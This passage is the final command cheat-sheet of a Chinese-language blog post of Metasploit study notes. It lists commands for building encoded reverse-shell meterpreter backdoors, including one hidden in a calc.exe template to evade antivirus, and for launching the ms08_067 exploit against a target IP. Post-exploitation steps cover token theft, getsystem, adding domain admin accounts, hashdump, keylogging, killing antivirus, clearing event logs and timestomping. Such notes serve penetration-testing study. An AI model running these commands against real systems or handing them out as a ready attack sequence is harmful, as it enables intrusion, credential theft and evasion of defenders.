<h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfconsole--commands">MSFconsole  Commands<a href="#msfconsole--commands" class="hash-link" aria-label="MSFconsole  Commands的直接链接" title="MSFconsole  Commands的直接链接">​</a></h3>
<ul>
<li>show exploits 查看所有exploit</li>
<li>show payloads 查看所有payload</li>
<li>show auxiliary 查看所有auxiliary</li>
<li>search name 搜索exploit等</li>
<li>info 查看加载模块的信息</li>
<li>use name 加载模块</li>
<li>LHOST 本机IP</li>
<li>RHOST 目标IP</li>
<li>set function 设置选项值</li>
<li>setg function  全局设置</li>
<li>show options 查看选项</li>
<li>show targets 查看exp可选的平台</li>
<li>set target num 设置exp作用平台</li>
<li>set payload payload  设置payload</li>
<li>show advanced 查看高级选项</li>
<li>set autorunscript migrate -f 设置自动执行指令</li>
<li>check 测试是否可利用</li>
<li>exploit 执行exp或模块</li>
<li>exploit  -j 作为后台执行</li>
<li>exploit  -z 成功后不立即打开session</li>
<li>exploit  -e encoder 指定encoder</li>
<li>exploit  -h  查看帮助信息</li>
<li>sessions  -l -v 列出可用sessions详细信息</li>
<li>sessions  -s script 在指定session执行脚本</li>
<li>sessions -K 结束session</li>
<li>sessions -c cmd 执行指定命令</li>
<li>sessions -u sessionID 升级shell</li>
<li>db_create name 创建数据库</li>
<li>db_connect name   连接数据库</li>
<li>db_nmap nmap扫描并导入结果</li>
<li>db_autopwn -h      查看autopwn帮助</li>
<li>db_autopwn -p -r -e 基于端口，反弹shell</li>
<li>db_destroy 删除数据库</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="meterpreter-commands">Meterpreter Commands<a href="#meterpreter-commands" class="hash-link" aria-label="Meterpreter Commands的直接链接" title="Meterpreter Commands的直接链接">​</a></h3>
<ul>
<li>help 查看帮助</li>
<li>run scriptname 运行脚本</li>
<li>sysinfo 系统基本信息</li>
<li>ls 列目录</li>
<li>use priv 运行提权组件</li>
<li>ps 列进程</li>
<li>migrate PID PID迁移</li>
<li>use incognito token窃取</li>
<li>list_tokens -u 查看可用用户token</li>
<li>list_tokens -g 查看可用组token</li>
<li>impersonate_token DOMAIN_NAME\USERNAME 模仿token</li>
<li>steal_token PID 窃取PID所属token并模仿</li>
<li>drop_token 停止模仿token</li>
<li>getsystem 获取SYSTEM权限</li>
<li>shell 运行shell</li>
<li>execute -f cmd.exe -i 交互式运行cmd</li>
<li>execute -f cmd.exe -i -t 使用可用token运行</li>
<li>execute -f cmd.exe -i -H -t 同上，同时隐藏进程</li>
<li>rev2self 返回至初始用户</li>
<li>reg command 修改注册表</li>
<li>setkesktop number 切换至另一已登录用户屏幕</li>
<li>screenshot 截屏</li>
<li>upload file 上传文件</li>
<li>download file  下载文件</li>
<li>keyscan_start 开始截取击键记录</li>
<li>keyscan_stop 停止截取击键记录</li>
<li>getprivs 尽可能提升权限</li>
<li>uictl enable keyboard/mouse 获取键盘或鼠标的控制权</li>
<li>background 将当前meterpreter shell转入后台</li>
<li>hashdump 导出所有用户hash</li>
<li>use sniffer 加载嗅探模块</li>
<li>sniffer_interfaces 查看可用网卡接口</li>
<li>sniffer_dump interfaceID pcapname 开始嗅探</li>
<li>sniffer_start interfaceID packet-buffer 指定buffer范围嗅探</li>
<li>sniffer_stats interfaceID   抓取统计信息</li>
<li>sniffer_stop interfaceID  停止嗅探</li>
<li>add_user username password -h ip 添加用户</li>
<li>add_group_user &quot;Domain Admins&quot; username -h ip 添加用户至管理组</li>
<li>clearev 清空日志</li>
<li>timestomp 改变文件属性如创建时间等</li>
<li>reboot 重启</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfpayload-commands">MSFpayload Commands<a href="#msfpayload-commands" class="hash-link" aria-label="MSFpayload Commands的直接链接" title="MSFpayload Commands的直接链接">​</a></h3>
<ul>
<li>msfpayload -h 查看帮助</li>
<li>msfpayload windows/meterpreter/bind_tcp 0 查看指定payload可用选项</li>
<li>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 X &gt; payload.exe 生成payload.exe</li>
<li>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R &gt; payload.raw 保存为RAW格式，可用于msfencode</li>
<li>msfpayload windows/meterpreter/bind_tcp LPORT=443 C &gt; payload.c 保存为C格式</li>
<li>msfpayload windows/meterpreter/bind_tcp LPORT=443 J &gt; payload.java 保存为java格式</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfencode-commands">MSFencode Commands<a href="#msfencode-commands" class="hash-link" aria-label="MSFencode Commands的直接链接" title="MSFencode Commands的直接链接">​</a></h3>
<ul>
<li>msfencode -h 查看帮助</li>
<li>msfencode -l 查看可用encoder</li>
<li>msfencode -t (c,elf.exe,java.js_le,js_be,perl,raw,ruby,vba,vbs,loop-vbs,asp,war,macho) 以指定格式显示编码后的buffer</li>
<li>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe 生成编码后的exe</li>
<li>msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c 生成纯字符格式C类型shellcode</li>
<li>msfpayload windows/meterpreter/bind_tcp LPORT=443 R | <br>
<!-- -->msfencode -e x86/countdown -c 5 -t raw | <br>
<!-- -->msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded.exe 多编码器结合，多次编码</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfcli-commands">MSFcli Commands<a href="#msfcli-commands" class="hash-link" aria-label="MSFcli Commands的直接链接" title="MSFcli Commands的直接链接">​</a></h3>
<ul>
<li><code>msfcli | grep exploit</code> 只显示exploit</li>
<li><code>msfcli | grep exploit/windows</code> 只显示windows exploit</li>
<li><code>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 RHOST=172.16.32.26 E</code> 针对指定IP加载指定exp并设定payload</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfninjafu">MSF,Ninja，Fu<a href="#msfninjafu" class="hash-link" aria-label="MSF,Ninja，Fu的直接链接" title="MSF,Ninja，Fu的直接链接">​</a></h3>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">* msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R | msfencode -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe 使用calc.exe作为模板，生成经过编码的后门</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R | msfencode -x calc,exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe 与上面差不多，只是执行的时候不依赖于生成的可执行文件，且不会有任何提示信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe &amp;&amp; msfcli multi/hanler PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 E 生成编码后的payload并开始监听本机端口</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfvenom">MSFvenom<a href="#msfvenom" class="hash-link" aria-label="MSFvenom的直接链接" title="MSFvenom的直接链接">​</a></h3>
<ul>
<li>msfvenom --payload 自动生成payload</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="meterpreter-post-exploitation-commands">Meterpreter Post Exploitation Commands<a href="#meterpreter-post-exploitation-commands" class="hash-link" aria-label="Meterpreter Post Exploitation Commands的直接链接" title="Meterpreter Post Exploitation Commands的直接链接">​</a></h3>
<p>提权一般步骤</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; getsystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; ps </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; steal_token 1784</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; shell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net user msf msf /add /DOMAIN</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net group &quot;Domain Admins&quot; msf /add /DOMAIN</span><br></span></code></pre></div></div>
<p>获取hash一般步骤</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; getsystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; hashdump</span><br></span></code></pre></div></div>
<p>如果是在win2008系统上：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run migrate</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run killav</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; ps </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; migrate 1436</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; keyscan_start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; keyscan_dump</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; keyscan_stop</span><br></span></code></pre></div></div>
<p>使用Incognito提权</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use incognito</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; list_tokens -u</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; getsystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; list_tokens -u</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; impersonate_token IHAZSECURITY\\Administrator</span><br></span></code></pre></div></div>
<p>查看保护机制并禁用之</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run getcountermeasure</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run getcountermeasure -h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run getcountermeasure -d -k</span><br></span></code></pre></div></div>
<ul>
<li>meterpreter&gt; run checkvm 检查是否是虚拟机</li>
<li>meterpreter&gt; shell 转入命令行</li>
<li>meterpreter&gt; run vnc 远程VNC控制</li>
<li>meterpreter&gt; background 转入后台</li>
<li>meterpreter&gt; run post/windows/escalate/bypassuac 执行Bypass UAC</li>
<li>meterpreter&gt; run post/osx/gather/hashdump 在OS X系统上dump hash</li>
<li>meterpreter&gt; run post/linux/gather/hashdump 在Linux 系统上dump hash</li>
</ul></div><footer class="docusaurus-mt-lg"><div class="row margin-top--sm theme-blog-footer-edit-meta-row"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/msf">msf</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/security">security</a></li></ul></div></div><div class="row margin-top--sm theme-blog-footer-edit-meta-row"><div class="col"><a href="https://github.com/itxx00/notes/tree/main/blog/2012-11-12-msf-study-note.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>编辑此页</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="博文分页导航"><a class="pagination-nav__link pagination-nav__link--prev" href="/notes/blog/2012/11/23/libvirt-snapshot-blockcommit-blockpull"><div class="pagination-nav__sublabel">较新一篇</div><div class="pagination-nav__label">浅析qcow2镜像文件的快照合并</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/notes/blog/2012/07/13/libvirt-storage-pool"><div class="pagination-nav__sublabel">较旧一篇</div><div class="pagination-nav__label">libvirt中storage pool的管理</div></a></nav></main><div class="col col--2"><div class="tableOfContents_bqdL thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#一名词解释" class="table-of-contents__link toc-highlight">一．名词解释</a></li><li><a href="#二msf基础" class="table-of-contents__link toc-highlight">二．MSF基础</a><ul><li><a href="#启动msf" class="table-of-contents__link toc-highlight">启动msf</a></li><li><a href="#获取帮助信息" class="table-of-contents__link toc-highlight">获取帮助信息</a></li><li><a href="#msfcli" class="table-of-contents__link toc-highlight">msfcli</a></li><li><a href="#模块使用示例" class="table-of-contents__link toc-highlight">模块使用示例</a></li><li><a href="#armitage使用" class="table-of-contents__link toc-highlight">armitage使用</a></li><li><a href="#msf其他组件" class="table-of-contents__link toc-highlight">msf其他组件</a></li></ul></li><li><a href="#三信息刺探与收集" class="table-of-contents__link toc-highlight">三．信息刺探与收集</a><ul><li><a href="#1攻击第一步基础信息收集" class="table-of-contents__link toc-highlight">1、攻击第一步：基础信息收集</a></li><li><a href="#2用nmap探测开放端口和服务" class="table-of-contents__link toc-highlight">2、用nmap探测开放端口和服务：</a></li><li><a href="#3msf与postgresql协同工作" class="table-of-contents__link toc-highlight">3、MSF与postgresql协同工作</a></li><li><a href="#4高级扫描方式" class="table-of-contents__link toc-highlight">4、高级扫描方式：</a></li><li><a href="#5特定扫描" class="table-of-contents__link toc-highlight">5、特定扫描：</a></li><li><a href="#6编写自定义扫描模块" class="table-of-contents__link toc-highlight">6、编写自定义扫描模块：</a></li></ul></li><li><a href="#四基本漏洞扫描" class="table-of-contents__link toc-highlight">四．基本漏洞扫描</a><ul><li><a href="#1-基本扫描" class="table-of-contents__link toc-highlight">1 基本扫描</a></li><li><a href="#2-与nexpose结合扫描" class="table-of-contents__link toc-highlight">2 与NeXpose结合扫描：</a></li><li><a href="#3与nessus结合扫描" class="table-of-contents__link toc-highlight">3、与nessus结合扫描：</a></li><li><a href="#4特殊扫描" class="table-of-contents__link toc-highlight">4、特殊扫描：</a></li><li><a href="#5使用autopwn处理扫描结果" class="table-of-contents__link toc-highlight">5、使用Autopwn处理扫描结果：</a></li></ul></li><li><a href="#五基础溢出命令" class="table-of-contents__link toc-highlight">五．基础溢出命令</a><ul><li><a href="#1基本命令" class="table-of-contents__link toc-highlight">1、基本命令：</a></li><li><a href="#2暴力端口探测" class="table-of-contents__link toc-highlight">2、暴力端口探测：</a></li><li><a href="#3msf脚本文件" class="table-of-contents__link toc-highlight">3、MSF脚本文件：</a></li></ul></li><li><a href="#六meterpreter" class="table-of-contents__link toc-highlight">六．METERPRETER</a><ul><li><a href="#1使用meterpreter" class="table-of-contents__link toc-highlight">1  、使用meterpreter</a></li><li><a href="#2令牌模拟" class="table-of-contents__link toc-highlight">2、令牌模拟：</a></li><li><a href="#3内网渗透" class="table-of-contents__link toc-highlight">3、内网渗透：</a></li><li><a href="#4meterpreter脚本" class="table-of-contents__link toc-highlight">4、Meterpreter脚本：</a></li><li><a href="#5升级command-shell" class="table-of-contents__link toc-highlight">5、升级command shell</a></li><li><a href="#6使用railgun操作windows-apis" class="table-of-contents__link toc-highlight">6、使用Railgun操作windows APIs</a></li></ul></li><li><a href="#七避开杀软" class="table-of-contents__link toc-highlight">七．避开杀软</a><ul><li><a href="#1使用msfpayload创建可执行后门" class="table-of-contents__link toc-highlight">1、使用msfpayload创建可执行后门：</a></li><li><a href="#2过杀软---使用msfencode编码后门" class="table-of-contents__link toc-highlight">2、过杀软---使用msfencode编码后门：</a></li><li><a href="#3多次编码" class="table-of-contents__link toc-highlight">3、多次编码：</a></li><li><a href="#4自定义可执行程序模板" class="table-of-contents__link toc-highlight">4、自定义可执行程序模板：</a></li><li><a href="#5暗度陈仓猥琐执行payload" class="table-of-contents__link toc-highlight">5、暗度陈仓—猥琐执行payload：</a></li><li><a href="#6加壳" class="table-of-contents__link toc-highlight">6、加壳：</a></li></ul></li><li><a href="#八使用用户端攻击方式client-side-attacks" class="table-of-contents__link toc-highlight">八．使用用户端攻击方式(client-side attacks)</a><ul><li><a href="#1组合型攻击" class="table-of-contents__link toc-highlight">1、组合型攻击</a></li><li><a href="#2文件格式exploit" class="table-of-contents__link toc-highlight">2、文件格式exploit</a></li></ul></li><li><a href="#九msf-附加模块" class="table-of-contents__link toc-highlight">九．MSF 附加模块</a></li><li><a href="#十社会工程学工具集set" class="table-of-contents__link toc-highlight">十．社会工程学工具集（SET）</a><ul><li><a href="#1set基本配置" class="table-of-contents__link toc-highlight">1、SET基本配置：</a></li><li><a href="#2网络钓鱼攻击" class="table-of-contents__link toc-highlight">2、网络钓鱼攻击:</a></li><li><a href="#3web方式攻击" class="table-of-contents__link toc-highlight">3、WEB方式攻击：</a></li><li><a href="#set其他特殊功能" class="table-of-contents__link toc-highlight">SET其他特殊功能：</a></li></ul></li><li><a href="#十一fast-track" class="table-of-contents__link toc-highlight">十一．FAST-TRACK</a><ul><li><a href="#1mssql工具" class="table-of-contents__link toc-highlight">1、MSSQL工具：</a></li><li><a href="#2binary-hex-转换器" class="table-of-contents__link toc-highlight">2、Binary-HEX 转换器：</a></li><li><a href="#3批量用户端攻击" class="table-of-contents__link toc-highlight">3、批量用户端攻击：</a></li></ul></li><li><a href="#十二karmerasploit" class="table-of-contents__link toc-highlight">十二．KARMERASPLOIT</a></li><li><a href="#十三构建自己的模块编写自己的exploitmeterpreter脚本编程" class="table-of-contents__link toc-highlight">十三．构建自己的模块，编写自己的exploit，meterpreter脚本编程</a></li><li><a href="#十四渗透实战演习" class="table-of-contents__link toc-highlight">十四．渗透实战演习</a></li><li><a href="#十五常用命令备忘" class="table-of-contents__link toc-highlight">十五．常用命令备忘</a><ul><li><a href="#msfconsole--commands" class="table-of-contents__link toc-highlight">MSFconsole  Commands</a></li><li><a href="#meterpreter-commands" class="table-of-contents__link toc-highlight">Meterpreter Commands</a></li><li><a href="#msfpayload-commands" class="table-of-contents__link toc-highlight">MSFpayload Commands</a></li><li><a href="#msfencode-commands" class="table-of-contents__link toc-highlight">MSFencode Commands</a></li><li><a href="#msfcli-commands" class="table-of-contents__link toc-highlight">MSFcli Commands</a></li><li><a href="#msfninjafu" class="table-of-contents__link toc-highlight">MSF,Ninja，Fu</a></li><li><a href="#msfvenom" class="table-of-contents__link toc-highlight">MSFvenom</a></li><li><a href="#meterpreter-post-exploitation-commands" class="table-of-contents__link toc-highlight">Meterpreter Post Exploitation Commands</a></li></ul></li></ul></div></div></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 老司机.</div></div></div></footer></div>
</body>
</html>